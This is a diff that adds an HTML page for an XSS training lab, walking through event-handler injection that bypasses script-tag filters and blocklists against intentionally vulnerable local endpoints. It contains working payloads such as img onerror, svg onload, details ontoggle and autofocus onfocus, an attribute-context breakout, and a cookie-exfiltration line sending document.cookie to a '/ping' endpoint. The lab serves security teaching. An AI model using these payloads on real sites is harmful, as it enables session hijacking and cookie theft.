@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 02 — Event Handler Injection | XSS Mastery</title>
+  <style>
+    :root{--bg:#0b0f1a;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;
+          --cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;
+          --orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;--teal:#0d9488}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;
+         padding:24px;max-width:960px;margin:0 auto}
+    h1{font-size:24px;color:var(--gold);margin-bottom:6px}
+    h2{font-size:15px;color:var(--cyan);margin:0 0 10px}
+    p{color:var(--muted);font-size:13.5px;line-height:1.65;margin-bottom:8px}
+    a{color:var(--cyan)} code{font-family:'Courier New',monospace;font-size:12px;
+    background:var(--code-bg);color:var(--cyan);padding:2px 5px;
+    border-radius:3px;border:1px solid var(--border)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:5px;
+        padding:10px;font-family:'Courier New',monospace;font-size:12px;
+        white-space:pre-wrap;word-break:break-all;color:var(--orange);margin:6px 0}
+    .section{background:var(--card);border:1px solid var(--border);
+             border-radius:8px;padding:18px 20px;margin-bottom:14px}
+    .section-hdr{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+    .sbadge{background:var(--border);color:var(--cyan);font-size:10px;
+            font-weight:700;padding:3px 8px;border-radius:10px}
+    .grid2{display:grid;grid-template-columns:1fr auto;gap:8px;align-items:start;margin:6px 0}
+    .grid2 pre{margin:0}
+    .btn{padding:6px 13px;border:none;border-radius:4px;cursor:pointer;
+         font-size:11.5px;font-weight:700;white-space:nowrap}
+    .fire{background:var(--red);color:#fff}.fire:hover{background:#ef4444}
+    .open{background:var(--teal);color:#fff}.open:hover{background:#0f766e}
+    .copy{background:var(--border);color:var(--text)}
+    .result{background:var(--code-bg);border:1px solid var(--border);border-radius:4px;
+            padding:8px;margin-top:6px;min-height:26px;font-size:12.5px;transition:border-color .2s}
+    .fired{border-color:var(--green)!important;color:var(--green)}
+    .note{font-size:12px;color:var(--muted);border-left:3px solid var(--purple);
+          padding:5px 9px;margin-top:6px;line-height:1.5}
+    .warn{background:#1f0f0f;border:1px solid var(--red);border-radius:5px;
+          padding:10px 14px;font-size:13px;color:#fca5a5;margin-bottom:12px}
+    .filter-proof{background:#0a1f13;border:1px solid var(--green);border-radius:5px;
+                  padding:10px 14px;font-size:13px;color:var(--green);margin:10px 0}
+    .tag-badge{font-size:10px;font-weight:700;padding:2px 6px;border-radius:3px;margin-left:5px;text-transform:uppercase}
+    .zero{background:#1a2f1a;color:var(--green)}.hover{background:#102030;color:var(--cyan)}
+    .click{background:#2f1f10;color:var(--orange)}
+  </style>
+</head>
+<body>
+
+  <p style="margin-bottom:12px"><a href="/">← Lab Home</a> · <a href="/event_catalog.html">Event Catalog →</a></p>
+  <h1>Attack 02 — Event Handler Injection (Mechanism 2)</h1>
+  <p style="font-size:14px;margin-bottom:16px">
+    Module 05 · Work through each section in order.
+    The goal: fire JavaScript execution on a server that blocks <code>&lt;script&gt;</code> tags.
+    Keep DevTools Console open throughout.
+  </p>
+
+  <div class="warn">
+    ⚠ The lab server endpoints are intentionally vulnerable.
+    All payloads execute real JavaScript in your browser's session context.
+  </div>
+
+  <!-- ─── STEP 1: Prove the script filter ─────────────────────────────── -->
+  <div class="section">
+    <div class="section-hdr"><span class="sbadge">STEP 1</span><h2>Prove the Script Filter Exists</h2></div>
+    <p>First, confirm the server's <code>/vuln-display</code> endpoint strips <code>&lt;script&gt;</code> tags.</p>
+    <div class="grid2">
+      <pre>&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
+      <button class="btn open" onclick="open('/vuln-display?content=%3Cscript%3Ealert(document.domain)%3C/script%3E','_blank')">Open in tab</button>
+    </div>
+    <div class="note">
+      The page shows the input, the filtered version (script tag removed), and the rendered output.
+      The alert does NOT fire. The filter works for this one vector.
+      Now watch every subsequent step bypass it.
+    </div>
+  </div>
+
+  <!-- ─── STEP 2: onerror bypass ───────────────────────────────────────── -->
+  <div class="section">
+    <div class="section-hdr">
+      <span class="sbadge">STEP 2</span>
+      <h2>onerror — Zero Interaction Bypass<span class="tag-badge zero">zero interaction</span></h2>
+    </div>
+    <p>
+      No <code>&lt;script&gt;</code> tag. No user action. The filter sees nothing dangerous.
+      The browser fires <code>onerror</code> when the image src fails to load.
+    </p>
+    <div class="grid2">
+      <pre>&lt;img src=x onerror=alert(document.domain)&gt;</pre>
+      <button class="btn open" onclick="open('/vuln-display?content=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E','_blank')">Open in tab</button>
+    </div>
+    <div class="filter-proof">✓ Filter bypass confirmed: no &lt;script&gt; tag present. Alert fires on page load.</div>
+    <div class="grid2" style="margin-top:8px">
+      <pre>&lt;img src=x onerror="fetch('/ping?c='+document.cookie)"&gt;</pre>
+      <button class="btn open" onclick="open('/vuln-display?content=%3Cimg+src%3Dx+onerror%3D%22fetch(%27/ping%3Fc%3D%27%2Bdocument.cookie)%22%3E','_blank')">Exfil demo</button>
+    </div>
+    <div class="note">
+      The exfiltration demo sends cookies to <code>/ping</code> (your own server).
+      Watch the Network panel — you'll see the <code>/ping?c=...</code> request.
+      In a real attack this URL points to the attacker's server.
+    </div>
+  </div>
+
+  <!-- ─── STEP 3: Live DOM injection (innerHTML) ───────────────────────── -->
+  <div class="section">
+    <div class="section-hdr">
+      <span class="sbadge">STEP 3</span>
+      <h2>innerHTML — Event Handlers Fire, Script Tags Don't<span class="tag-badge zero">zero interaction</span></h2>
+    </div>
+    <p>
+      Confirm the innerHTML asymmetry directly in this page.
+      The two buttons below inject into the same output box — only one fires.
+    </p>
+    <div class="grid2">
+      <pre>&lt;script&gt;alert('innerHTML script')&lt;/script&gt;</pre>
+      <button class="btn fire" onclick="injectInner('&lt;script&gt;document.getElementById(\"r3a\").textContent=\"script tag via innerHTML — FIRED\"&lt;/scr'+'ipt&gt;','r3a','r3a-status',false)">Inject script tag</button>
+    </div>
+    <div class="result" id="r3a">Waiting for injection…</div>
+    <div class="result" id="r3a-status" style="margin-top:4px"></div>
+
+    <div class="grid2" style="margin-top:10px">
+      <pre>&lt;img src=x onerror=document.getElementById('r3b').textContent='onerror via innerHTML — FIRED'&gt;</pre>
+      <button class="btn fire" onclick="injectInner('<img src=x onerror=\"document.getElementById(\'r3b\').textContent=\'onerror via innerHTML — FIRED\';document.getElementById(\'r3b\').className=\'result fired\'\">', 'r3b','r3b-status',true)">Inject onerror</button>
+    </div>
+    <div class="result" id="r3b">Waiting for injection…</div>
+    <div class="result" id="r3b-status" style="margin-top:4px"></div>
+    <div class="note">
+      The script tag injection produces a DOM node but no execution.
+      The onerror injection fires immediately. This is the HTML5 spec in action —
+      and the reason every DOM XSS payload uses event handlers, not script tags.
+    </div>
+  </div>
+
+  <!-- ─── STEP 4: onload via SVG ───────────────────────────────────────── -->
+  <div class="section">
+    <div class="section-hdr">
+      <span class="sbadge">STEP 4</span>
+      <h2>SVG onload — Inline SVG Execution<span class="tag-badge zero">zero interaction</span></h2>
+    </div>
+    <p>
+      SVG is valid HTML5. An inline <code>&lt;svg&gt;</code> with an <code>onload</code>
+      attribute fires immediately when parsed — even via innerHTML in this case.
+    </p>
+    <div class="grid2">
+      <pre>&lt;svg onload=alert(document.domain)&gt;</pre>
+      <button class="btn fire" onclick="injectSVG()">Fire SVG onload</button>
+    </div>
+    <div class="result" id="r4">Waiting…</div>
+    <div class="grid2" style="margin-top:8px">
+      <pre>&lt;svg onload=alert(document.domain)&gt;</pre>
+      <button class="btn open" onclick="open('/vuln-display?content=%3Csvg+onload%3Dalert(document.domain)%3E','_blank')">Via server filter</button>
+    </div>
+    <div class="note">
+      Via the server: the filter sees no <code>&lt;script&gt;</code> tag.
+      SVG passes through. <code>onload</code> fires on the SVG element immediately.
+      This is why SVG upload is studied separately in Module 07.
+    </div>
+  </div>
+
+  <!-- ─── STEP 5: details ontoggle ─────────────────────────────────────── -->
+  <div class="section">
+    <div class="section-hdr">
+      <span class="sbadge">STEP 5</span>
+      <h2>&lt;details&gt; ontoggle — Fires at Parse Time<span class="tag-badge zero">zero interaction</span></h2>
+    </div>
+    <p>
+      The <code>open</code> attribute on a <code>&lt;details&gt;</code> element
+      causes an immediate <code>toggle</code> event at parse time. No user action.
+      Works via innerHTML. Rarely in blocklists.
+    </p>
+    <div class="grid2">
+      <pre>&lt;details open ontoggle=alert(document.domain)&gt;</pre>
+      <button class="btn fire" onclick="injectToggle()">Fire ontoggle</button>
+    </div>
+    <div class="result" id="r5">Waiting…</div>
+    <div class="grid2" style="margin-top:8px">
+      <pre>&lt;details open ontoggle=alert(document.domain)&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cdetails+open+ontoggle%3Dalert(document.domain)%3E','_blank')">Via blocklist filter</button>
+    </div>
+    <div class="note">
+      The <code>/filter-demo</code> endpoint blocks <code>onerror</code> and <code>onload</code>
+      but not <code>ontoggle</code>. The payload passes through. This is the
+      long-tail problem — you cannot enumerate every event handler.
+    </div>
+  </div>
+
+  <!-- ─── STEP 6: autofocus onfocus ────────────────────────────────────── -->
+  <div class="section">
+    <div class="section-hdr">
+      <span class="sbadge">STEP 6</span>
+      <h2>autofocus + onfocus — Zero-Interaction Input Hijack<span class="tag-badge zero">zero interaction</span></h2>
+    </div>
+    <p>
+      <code>autofocus</code> makes the browser focus the element immediately on load,
+      triggering <code>onfocus</code>. Works from a server-side attribute injection
+      where angle brackets are blocked.
+    </p>
+    <div class="grid2">
+      <pre>&lt;input autofocus onfocus=alert(document.domain)&gt;</pre>
+      <button class="btn fire" onclick="injectFocus()">Fire onfocus</button>
+    </div>
+    <div class="result" id="r6">Waiting…</div>
+    <div class="note">
+      Especially powerful in attribute-context injection:
+      <code>" autofocus onfocus="alert(1)</code> — no angle brackets needed.
+      Covered in Module 04 Step 5.
+    </div>
+  </div>
+
+  <!-- ─── STEP 7: The long tail — filter bypass table ─────────────────── -->
+  <div class="section">
+    <div class="section-hdr"><span class="sbadge">STEP 7</span><h2>The Long Tail — Bypass the /filter-demo Blocklist</h2></div>
+    <p>
+      The <code>/filter-demo</code> endpoint blocks: <code>&lt;script</code>,
+      <code>javascript:</code>, <code>onerror</code>, <code>onload</code>, <code>onclick</code>.
+      Every payload below bypasses all five rules.
+    </p>
+
+    <div style="display:grid;grid-template-columns:1fr auto;gap:6px;align-items:start">
+
+      <pre>&lt;details open ontoggle=alert(document.domain)&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cdetails+open+ontoggle%3Dalert(document.domain)%3E','_blank')">Test</button>
+
+      <pre>&lt;svg onmouseover=alert(document.domain)&gt;hover&lt;/svg&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Csvg+onmouseover%3Dalert(document.domain)%3E hover%3C/svg%3E','_blank')">Test</button>
+
+      <pre>&lt;input autofocus onfocus=alert(document.domain)&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cinput+autofocus+onfocus%3Dalert(document.domain)%3E','_blank')">Test</button>
+
+      <pre>&lt;div onmousemove=alert(document.domain) style="padding:40px"&gt;move mouse here&lt;/div&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cdiv+onmousemove%3Dalert(document.domain)+style%3D%22padding%3A40px%22%3Emove+mouse%3C/div%3E','_blank')">Test</button>
+
+      <pre>&lt;body onpaste=alert(document.domain)&gt;&lt;textarea&gt;paste here&lt;/textarea&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cbody+onpaste%3Dalert(document.domain)%3E%3Ctextarea%3Epaste+here%3C/textarea%3E','_blank')">Test</button>
+
+      <pre>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;div style="animation:x" onanimationstart=alert(1)&gt;</pre>
+      <button class="btn open" onclick="open('/filter-demo?q=%3Cstyle%3E@keyframes+x{}%3C/style%3E%3Cdiv+style%3D%22animation%3Ax%22+onanimationstart%3Dalert(1)%3E','_blank')">Test</button>
+
+    </div>
+    <div class="note" style="margin-top:10px">
+      Each of these uses an event not in the blocklist. A correct defence uses
+      an <em>allowlist</em> of permitted attributes — not a blocklist of forbidden ones.
+      The <a href="/event_catalog.html">Event Catalog</a> shows 40+ vectors;
+      no blocklist can ever be complete.
+    </div>
+  </div>
+
+  <script>
+    function injectInner(html, targetId, statusId, expectFire) {
+      const el = document.getElementById(targetId);
+      const st = document.getElementById(statusId);
+      el.innerHTML = html;
+      st.textContent = expectFire
+        ? "Injected via innerHTML. Watch the result box above."
+        : "Injected via innerHTML. Script tag created in DOM but NOT executed (HTML5 spec §8.4.1).";
+      st.className = "result" + (expectFire ? " fired" : "");
+    }
+    function injectSVG() {
+      const d = document.getElementById("r4");
+      d.innerHTML = '<svg onload="document.getElementById(\'r4\').textContent=\'M2 fired: SVG onload via innerHTML\';document.getElementById(\'r4\').className=\'result fired\'"><rect width=0 height=0/></svg>';
+    }
+    function injectToggle() {
+      const d = document.getElementById("r5");
+      d.innerHTML = '<details open ontoggle="document.getElementById(\'r5\').textContent=\'M2 fired: ontoggle at parse time — no user action\';document.getElementById(\'r5\').className=\'result fired\'"><summary>x</summary></details>';
+    }
+    function injectFocus() {
+      const d = document.getElementById("r6");
+      d.innerHTML = '<input autofocus onfocus="document.getElementById(\'r6\').textContent=\'M2 fired: onfocus via autofocus — zero interaction\';document.getElementById(\'r6\').className=\'result fired\';this.remove()" style="opacity:0;position:absolute">';
+    }
+  </script>
+
+</body>
+</html>
